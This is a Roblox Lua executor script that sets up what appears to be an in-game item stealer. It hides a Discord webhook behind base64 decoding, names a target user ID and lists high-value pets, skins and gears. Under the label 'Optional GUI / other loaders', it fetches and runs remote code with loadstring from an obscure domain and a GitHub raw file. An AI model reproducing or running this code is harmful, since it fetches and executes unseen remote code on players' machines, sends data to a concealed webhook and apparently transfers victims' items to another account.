local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MDM1NjE3MDUwODY2OTAxOS9jUEdSeVBMYUIwUDdudVljRDRTX2xJVHp6cGZzbHpmVlVMU3dKZmxmSzJrSnYzcnVuOGZUeFhIVS03WkZQSmRYb0U2RQ=="
    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o,b={},{}
    for i=1,#B do b[B:sub(i,i)]=i-1 end
    local n,bits=0,0
    for i=1,#d do
        local c=d:sub(i,i)
        if c~='=' then
            local v=b[c]
            if v then
                n=n*64+v; bits=bits+6
                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
            end
        end
    end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 11190168631

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Phoenix",
    "Los Dragons",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Plant Bros",
    "Signore Carapace",
    "Love Love Bear",
    "Moby Bros",
    "Hydra Serpent",
    "Arcadragon",
    "Dragon Cannelloni",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Venuspino",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "La Breakfast Combinasion",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Orchidox",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Cash or Card",
    "Foxini Lanternini",
    "Pancake and Syrup",
    "Draculino",
    "Fishino Clownino",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Truckini",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "La Fuse Machine",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "Yetimatic",
    "Gold and Diamond",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "La Craft Machine",
    "Los Hackers",
    "Capitano Americano",
    "Rubiko and Kubiko",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Sammyni Fattini",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Grabatron",
    "Pop Pop Petalini",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Polaroidini",
    "Steakini Fattini",
    "Garama and Madundung",
    "Jolly Jolly Sahur",
    "Gym Bros",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Dug Dug Dug",
    "Fragola La La La",
    "Globa Steppa"
}

genv.ALLOWED_BASESKINS = {
    ["Tralala"] = true,
    ["Bee Emperor"] = true,
    ["Octo"] = true
}

genv.ALLOWED_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Candy Sentry"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    ""
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=zeno3v80"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)